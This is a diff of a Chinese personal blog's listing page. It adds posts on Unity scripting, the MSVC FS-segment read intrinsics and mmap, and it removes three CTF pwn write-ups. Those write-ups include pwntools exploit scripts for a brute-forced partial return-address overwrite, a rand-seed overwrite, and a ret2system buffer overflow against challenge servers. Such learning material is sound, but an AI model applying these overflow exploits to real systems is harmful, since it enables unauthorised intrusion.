&#125;</span><br><span class="line">&#125;</span><br><span class="line">//点击放大一下，打印日志</span><br><span class="line">//机制：射线投射器和射线接收器</span><br></pre></td></tr></table></figure></p>
+<h4 id="unity中三种调用其他脚本函数的方法">unity中三种调用其他脚本函数的方法</h4>
+<p>第一种，被调用脚本函数为static类型，调用时直接用 脚本名.函数名()。很不实用……</p>
+<p>第二种，GameObject.Find("脚本所在物体名").SendMessage("函数名"); 此种方法可以调用public和private类型函数//无返回值</p>
+<p>第三种，GameObject.Find("脚本所在物体名").GetComponent<脚本名>().函数名();此种方法只可以调用public类型函数//有返回值</脚本名></p>
+<h4 id="退出游戏">退出游戏</h4>
+<p>在unity编辑界面实现退出游戏</p>
+<p>调用这个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    void QuitGame()</span><br><span class="line">    &#123;</span><br><span class="line">#if UNITY_EDITOR</span><br><span class="line">        UnityEditor.EditorApplication.isPlaying = false;</span><br><span class="line">#else</span><br><span class="line">            Application.Quit();</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h4 id="开始界面">开始界面</h4>
+<p>using UnityEngine.UI</p>
+<p>using UnityEngine.Scenemanagement</p>
+<h4 id="小坑">小坑</h4>
+<p>各种路径不要出现中文，每次保存加载一万年</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/29/read-byte-word/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="甜药补习班吊尾生">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/04/29/read-byte-word/" class="post-title-link" itemprop="url">read_byte_word</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-04-29 14:50:27 / Modified: 22:12:11" itemprop="dateCreated datePublished" datetime="2021-04-29T14:50:27+08:00">2021-04-29</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>从相对于 FS 段开头的偏移量指定的位置读取内存。</p>
+<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>C</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> __readfsbyte(<span class="keyword">unsigned</span> <span class="keyword">long</span> Offset);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> __readfsword(<span class="keyword">unsigned</span> <span class="keyword">long</span> Offset);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> __readfsdword(<span class="keyword">unsigned</span> <span class="keyword">long</span> Offset);</span><br><span class="line"><span class="keyword">unsigned</span> __int64 __readfsqword(<span class="keyword">unsigned</span> <span class="keyword">long</span> Offset);</span><br></pre></td></tr></table></figure>
+
+<h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>字节、字、双字名为的函数的名称指示 <code>FS:[Offset]</code> 。</p>
+<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><table>
+<thead>
+<tr>
+<th>Intrinsic</th>
+<th>体系结构</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>__readfsbyte</code></td>
+<td>x86</td>
+</tr>
+<tr>
+<td><code>__readfsdword</code></td>
+<td>x86</td>
+</tr>
+<tr>
+<td><code>__readfsqword</code></td>
+<td>x86</td>
+</tr>
+<tr>
+<td><code>__readfsword</code></td>
+<td>x86</td>
+</tr>
+</tbody></table>
+<p><strong>头文件</strong> &lt;intrin.h&gt;</p>
+<p>例子：</p>
+<img src="/2021/04/29/read-byte-word/1.png" class>
+
+<img src="/2021/04/29/read-byte-word/2.png" class>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/29/mmap%E5%87%BD%E6%95%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="甜药补习班吊尾生">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/04/29/mmap%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">mmap函数</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-04-29 14:18:38 / Modified: 15:37:39" itemprop="dateCreated datePublished" datetime="2021-04-29T14:18:38+08:00">2021-04-29</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>getpagesize()获得分页大小</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize)//定义</span><br><span class="line">//说明：mmap()用来将某个文件内容映射到内存中，对该内存区域的存取即是直接对该文件内容的读写</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>start</td>
+<td>指向欲对应的内存起始地址，通常设为NULL，代表让系统自动选定地址，对应成功后该地址会返回。</td>
+</tr>
+<tr>
+<td>length</td>
+<td>代表将文件中多大的部分对应到内存。</td>
+</tr>
+<tr>
+<td>prot</td>
+<td>代表映射区域的保护方式，有下列组合：1.PROT_EXEC  映射区域可被执行；2.PROT_READ  映射区域可被读取； PROT_WRITE  映射区域可被写入；3.PROT_NONE  映射区域不能存取。</td>
+</tr>
+<tr>
+<td>flags</td>
+<td>会影响映射区域的各种特性： MAP_FIXED  如果参数 start 所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。 MAP_SHARED  对应射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。 MAP_PRIVATE  对应射区域的写入操作会产生一个映射文件的复制，即私人的”写入时复制” (copy on write)对此区域作的任何修改都不会写回原来的文件内容。 MAP_ANONYMOUS  建立匿名映射，此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。 MAP_DENYWRITE  只允许对应射区域的写入操作，其他对文件直接写入的操作将会被拒绝。 MAP_LOCKED  将映射区域锁定住，这表示该区域不会被置换(swap)。       在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</td>
+</tr>
+<tr>
+<td>fd</td>
+<td>open()返回的文件描述词，代表欲映射到内存的文件。</td>
+</tr>
+<tr>
+<td>offset</td>
+<td>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。</td>
+</tr>
+</tbody></table>
+<p>返回值：若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(-1)，错误原因存于errno 中。</p>
+<p>错误代码：</p>
+<ul>
+<li>EBADF  参数fd 不是有效的文件描述词。</li>
+<li>EACCES  存取权限有误。如果是MAP_PRIVATE 情况下文件必须可读，使用MAP_SHARED 则要有PROT_WRITE 以及该文件要能写入。</li>
+<li>EINVAL  参数start、length 或offset 有一个不合法。</li>
+<li>EAGAIN  文件被锁住，或是有太多内存被锁住。</li>
+<li>ENOMEM  内存不足。</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -848,272 +1301,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/24/Nep-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="甜药补习班吊尾生">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/03/24/Nep-1/" class="post-title-link" itemprop="url">Nep_1</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-03-24 15:50:52" itemprop="dateCreated datePublished" datetime="2021-03-24T15:50:52+08:00">2021-03-24</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-04-10 16:45:44" itemprop="dateModified" datetime="2021-04-10T16:45:44+08:00">2021-04-10</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>程序开启了随机地址保护——<strong>但随机地址不包括低三位的地址</strong></p>
-<img src="/2021/03/24/Nep-1/3.png" class>
-
-<img src="/2021/03/24/Nep-1/2.png" class>
-
-<p>v4用于接收我们的输入数据，能存放8个字节</p>
-<p>sub_10D0猜测是read函数，因为语法还有对应的汇编代码极其相似</p>
-<p>所以输入8个字节的数据覆盖v4，在输入8个字节覆盖 保存的ebp（因为程序是64位，所以ebp为8个字节），接下来就可以返回地址覆盖上所需跳转的地址。</p>
-<img src="/2021/03/24/Nep-1/1.png" class>
-
-<p>这里是想要跳转到底地址，可以输出flag的函数。</p>
-<p>但程序开启了ASLR，除了低3位的地址以外其余全是扯淡，所以记录下这个函数的开头的第三位地址，但整个程序的的地址也才4位，所以可以随机选一个第四位地址，多次打击，欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉，1/16的概率能打中。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">36058</span>)</span><br><span class="line">	io.send(<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+p16(<span class="number">0x64e1</span>))</span><br><span class="line">	res = io.recvall()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>p64()—-8个字节<br>p32()—-4个字节<br>p16()—-2个字节</p>
-<p>为什么要用p16()不知道，猜测和程序的栈溢出保护有关。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/16/AD-guess-num/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="甜药补习班吊尾生">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/03/16/AD-guess-num/" class="post-title-link" itemprop="url">AD_guess_num</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-03-16 17:18:41" itemprop="dateCreated datePublished" datetime="2021-03-16T17:18:41+08:00">2021-03-16</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-03-19 21:20:22" itemprop="dateModified" datetime="2021-03-19T21:20:22+08:00">2021-03-19</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <img src="/2021/03/16/AD-guess-num/1.png" class>
-
-<p>可以看出要进行10次猜测，保证每次猜测（v4）与v6相等，即可执行sub_C3E，sub_C3E是能得到的flag函数。</p>
-<p>v6来自伪随机函数rand()</p>
-<p>rand()需要srand()提供的种子，只要种子相同，rand()就一定相同。</p>
-<p>此处种子为seed</p>
-<img src="/2021/03/16/AD-guess-num/2.png" class>
-<p>该图中地址为ida地址，1代表1个字节</p>
-<img src="/2021/03/16/AD-guess-num/1.jpg" class>
-
-<p>该程序用gets来读取&amp;v7（name）（），所以可以用名字覆盖种子（写入我们需要的种子），再另外写一个cpp程序来看看该种子对应的rand（）函数值。</p>
-<p><strong>ida地址表示1相当于1个字节</strong></p>
-<p>名字写入0x24个a，相当于从客户端·输入32个a，一个a一个字节，刚好覆盖完-30h到-10h的地址，触及seed的地址，seed的类型是unsigned int，故seed[0]的大小为4个字节，故选取的种子4个a。</p>
-<p>这里特别要注意，由于题目本身是在linux下的，所以我们自己写的程序也要在linux下进行测试，不同的平台所产生的结果是不同的（我吐了，卡了老子这久）</p>
-<img src="/2021/03/16/AD-guess-num/2.jpg" class>
-
-<p><em>顺便需要学习在Linux中编写c</em></p>
-<p><em>首先确保安装了gcc，g++。我的linux里已经有了</em></p>
-<p><em>新建文件夹命名为xxx.cpp或xxx.c</em></p>
-<p><em>编写，保存</em></p>
-<p><em>用命令编译，g++ xxx.cpp 或 gcc xxx.c</em></p>
-<p><em>如果成功，会得到一个可执行程序，xxx.out</em></p>
-<p><em>运行，./xxx.out，会输出结果</em></p>
-<p>回到这题</p>
-<p>附件只提供参考，flag不在附件中，如果单纯运行附件答题能成功，但给不出flag（怎么想怎么对，我之前竟然不知道）</p>
-<p>所以有两个方法完成这题</p>
-<p>第一种方法nc服务器，输入0x24个a，也就是36个a，答题，得到flag </p>
-<p>第二种方法是使用脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">47746</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your name:&quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">ans=[<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">	io.recvuntil(<span class="string">&quot;Please input your guess number:&quot;</span>)</span><br><span class="line">	io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/14/AD-level2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="甜药补习班吊尾生">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/03/14/AD-level2/" class="post-title-link" itemprop="url">AD_level2</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-03-14 12:52:34" itemprop="dateCreated datePublished" datetime="2021-03-14T12:52:34+08:00">2021-03-14</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-03-16 00:47:01" itemprop="dateModified" datetime="2021-03-16T00:47:01+08:00">2021-03-16</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>庆祝第一次自己找到漏洞</p>
-<img src="/2021/03/14/AD-level2/1.png" class>
-<p>buf的大小为0x88，但却能读入0x100，造成了溢出</p>
-<p>​    <img src="/2021/03/14/AD-level2/2.png" class><br>​    敏感函数system的地址：0x08048320<br>​    <code>_system</code>函数里面有system(command)</p>
-<img src="/2021/03/14/AD-level2/3.png" class>
-<p>关键字符串的地址：0x0804A024</p>
-<p>在32位程序运行中，函数参数直接压入栈中。<br>调用函数时栈的结构为：1调用<strong>函数地址</strong>，2调用<strong>函数返回地址</strong>，参数n，参数n-1，参数。。。</p>
-<p>用0x88个字符覆盖栈，在用0x04个字符覆盖ebp的地址，将返回地址覆写为system函数。<br>根据调用函数时栈的结构，system函数需要返回地址，故写入0x04个字符作为虚假的返回地址（不起作用），在写入bin_sh命令作为system的参数。<br>关键在于，弄清system函数的底层结构。</p>
-<img src="/2021/03/14/AD-level2/1.jpg" class>
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 </div>
